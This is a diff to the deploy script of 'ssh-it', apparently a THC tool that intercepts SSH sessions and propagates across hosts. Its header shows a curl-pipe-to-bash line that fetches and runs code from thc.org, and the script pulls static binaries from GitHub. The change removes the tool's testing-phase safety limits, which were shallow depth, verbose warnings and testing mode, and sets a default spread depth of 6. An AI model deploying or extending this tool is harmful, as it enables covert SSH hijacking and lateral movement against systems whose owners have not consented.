@@ -6,7 +6,16 @@
 #
 # This script is typically invoked likes this:
 # 	$ bash -c "$(curl -fsSL thc.org/ssh-it/x)"
-
+#
+# Environment variables:
+#
+# THC_DEPTH=6    - Set depth of when ssh-it shall stop
+#
+# THC_VERBOSE=1  - Enable verbose warning when ssh is intercepted.
+#
+# THC_DEBUG=1    - Enable debug output
+#
+# THC_USELOCAL=1 - Use local binaries (do not use curl/wget to dl static bins)
 
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
 URL_DEPLOY="ssh-it.thc.org/x"
@@ -23,16 +32,7 @@ CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
 
-# Defaults for 'safety off' (THC_NO_CONDOME)
-_DEFAULT_NOCO_THC_DEPTH=6
-_DEFAULT_NOCO_THC_VERBOSE=
-
-# While in PoC/Alpha phase we use some different defaults for testing & debugging
-_DEFAULT_THC_DEPTH=2
-_DEFAULT_THC_VERBOSE=1
-_DEFAULT_THC_TESTING=1
-# _DEFAULT_THC_TESTING=
-
+_DEFAULT_THC_DEPTH=6
 
 if [[ -z $THC_DEBUG ]]; then
 	DEBUGF(){ :;}
@@ -97,19 +97,7 @@ init_vars()
 	local is_set_thc_recheck_time
 	local is_set_thc_testing
 
-	[[ -n THC_VERBOSE ]] && is_set_thc_verbose=1
-	[[ -n THC_DEPTH ]] && is_set_thc_depth=1
-	[[ -n THC_TESTING ]] && is_set_thc_testing=1
-
-	if [[ -n $THC_NO_CONDOME ]]; then
-		# HERE: Remove all safety limits
-		[[ -n $is_set_thc_verbose ]] && THC_VERBOSE="${_DEFAULT_NOCO_THC_VERBOSE}"
-		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_NOCO_THC_DEPTH}"
-		[[ -n $is_set_thc_testing ]] && unset THC_TESTING
-	else
-		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"
-		[[ -n $is_set_thc_testing ]] && THC_TESTING="${_DEFAULT_THC_TESTING}"
-	fi
+	[[ -z $THC_DEPTH ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"
 
 	[[ -n $THC_NO_VERBOSE ]] && unset THC_VERBOSE
 
